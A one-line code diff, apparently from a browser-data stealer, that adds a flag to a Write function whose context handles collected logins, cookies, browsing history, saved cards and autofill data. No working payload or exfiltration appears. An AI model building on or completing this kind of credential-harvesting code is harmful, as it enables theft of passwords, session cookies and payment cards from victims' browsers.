@@ -249,6 +249,7 @@ def Write(pathToLogs, browser):
     global downhistory
     global cards
     global autofills
+    colected = False
 
     if logins or cookies or history or downhistory or cards or autofills:
         try:
